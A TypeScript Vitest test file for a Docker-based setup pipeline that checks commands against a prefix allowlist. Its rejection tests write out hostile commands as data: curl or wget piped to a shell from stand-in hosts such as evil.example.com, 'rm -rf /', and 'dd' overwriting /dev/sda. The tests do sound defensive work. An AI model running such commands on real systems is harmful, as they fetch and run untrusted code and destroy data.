import { describe, it, expect, vi, beforeEach } from 'vitest';

// Mock dockerode and pino before importing the module under test
vi.mock('dockerode', () => ({
  default: vi.fn(),
}));

vi.mock('pino', () => ({
  default: vi.fn(() => ({
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
  })),
}));

import { runSetupPipeline } from '../container-setup.js';
import Docker from 'dockerode';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makeContainer(overrides: {
  start?: () => Promise<void>;
  attach?: () => Promise<NodeJS.EventEmitter>;
  wait?: () => Promise<{ StatusCode: number }>;
  remove?: () => Promise<void>;
  stop?: () => Promise<void>;
  modem?: { demuxStream: (stream: NodeJS.EventEmitter, stdout: { write: (c: Buffer) => void }, stderr: { write: (c: Buffer) => void }) => void };
} = {}): unknown {
  const eventEmitter = Object.assign(Object.create(null), {
    on: vi.fn().mockImplementation(function(this: unknown, event: string, handler: () => void) {
      if (event === 'end') setImmediate(handler);
      return this;
    }),
  });

  return {
    start: vi.fn().mockResolvedValue(undefined),
    attach: vi.fn().mockResolvedValue(eventEmitter),
    wait: vi.fn().mockResolvedValue({ StatusCode: 0 }),
    remove: vi.fn().mockResolvedValue(undefined),
    stop: vi.fn().mockResolvedValue(undefined),
    modem: {
      demuxStream: vi.fn(),
    },
    ...overrides,
  };
}

function makeDocker(container = makeContainer()): Docker {
  const mockDocker = {
    createContainer: vi.fn().mockResolvedValue(container),
  } as unknown as Docker;
  return mockDocker;
}

const baseOpts = {
  image: 'node:22',
  workspacePath: '/workspaces/ws-001',
  setupCommands: [],
  preFlightCommands: [],
  env: {},
  security: {},
};

beforeEach(() => {
  vi.clearAllMocks();
});

// ---------------------------------------------------------------------------
// Command allowlist — allowed commands
// ---------------------------------------------------------------------------

describe('runSetupPipeline — allowed commands pass validation', () => {
  it('should succeed when pnpm install is the only command', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['pnpm install'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(true);
    expect(result.failedStep).toBeUndefined();
  });

  it('should succeed when npm ci is the only command', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['npm ci'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(true);
  });

  it('should succeed when yarn install is the only command', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['yarn install --frozen-lockfile'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(true);
  });

  it('should succeed when git submodule update is the only command', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['git submodule update --init --recursive'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(true);
  });

  it('should succeed when pip install is the only command', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['pip install -r requirements.txt'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(true);
  });

  it('should succeed when make build is the only command', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['make build'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(true);
  });

  it('should succeed for bare make (prefix without trailing space)', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['make'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(true);
  });

  it('should succeed when tsc is the only command', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, preFlightCommands: ['tsc --noEmit'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Command allowlist — dangerous commands are rejected before any container starts
// ---------------------------------------------------------------------------

describe('runSetupPipeline — dangerous commands are rejected', () => {
  it('should reject curl piped to bash', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['curl https://evil.example.com | bash'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(false);
    expect(result.failedStep).toBe('curl https://evil.example.com | bash');
    expect(docker.createContainer).not.toHaveBeenCalled();
  });

  it('should reject rm -rf /', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['rm -rf /'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(false);
    expect(docker.createContainer).not.toHaveBeenCalled();
  });

  it('should reject a raw bash invocation', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['bash -c "malicious"'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(false);
    expect(result.output).toMatch(/rejected/i);
  });

  it('should reject wget piped to sh', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['wget https://malware.sh | sh'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(false);
  });

  it('should reject dd if=/dev/urandom', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['dd if=/dev/urandom of=/dev/sda'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(false);
  });

  it('should reject a command that is just a whitespace-padded disallowed prefix', async () => {
    // Arrange — leading space should not bypass the allowlist
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['  rm -rf /home'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(false);
  });

  it('should reject a disallowed command in preFlightCommands', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = {
      ...baseOpts,
      setupCommands: ['pnpm install'],
      preFlightCommands: ['curl https://evil.com | bash'],
    };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert — entire pipeline aborted before any container starts
    expect(result.success).toBe(false);
    expect(docker.createContainer).not.toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// Empty command list short-circuits
// ---------------------------------------------------------------------------

describe('runSetupPipeline — empty command list', () => {
  it('should return success immediately when no commands are supplied', async () => {
    // Arrange
    const docker = makeDocker();

    // Act
    const result = await runSetupPipeline(docker, baseOpts);

    // Assert
    expect(result.success).toBe(true);
    expect(result.output).toBe('');
    expect(docker.createContainer).not.toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// Container exit code handling
// ---------------------------------------------------------------------------

describe('runSetupPipeline — container exit code handling', () => {
  it('should return success when container exits with code 0', async () => {
    // Arrange
    const container = makeContainer({
      wait: vi.fn().mockResolvedValue({ StatusCode: 0 }),
    });
    const docker = makeDocker(container);
    const opts = { ...baseOpts, setupCommands: ['pnpm install'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(true);
  });

  it('should return failure when container exits with non-zero code', async () => {
    // Arrange
    const container = makeContainer({
      wait: vi.fn().mockResolvedValue({ StatusCode: 1 }),
    });
    const docker = makeDocker(container);
    const opts = { ...baseOpts, setupCommands: ['pnpm install'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(false);
    expect(result.failedStep).toBe('pnpm install');
  });
});

// ---------------------------------------------------------------------------
// Command prefix matching correctness
// ---------------------------------------------------------------------------

describe('runSetupPipeline — command prefix matching', () => {
  it('should treat "pnpx" as disallowed (not a valid prefix)', async () => {
    // Arrange — "pnpx" is not in the allowlist
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['pnpx some-tool'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(false);
  });

  it('should treat "npx " as allowed (exact prefix match)', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['npx some-tool'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(true);
  });

  it('should treat "bun install" as allowed', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['bun install'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(true);
  });

  it('should treat "cargo build" as allowed', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['cargo build --release'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(true);
  });

  it('should treat "go build" as allowed', async () => {
    // Arrange
    const docker = makeDocker();
    const opts = { ...baseOpts, setupCommands: ['go build ./...'] };

    // Act
    const result = await runSetupPipeline(docker, opts);

    // Assert
    expect(result.success).toBe(true);
  });
});
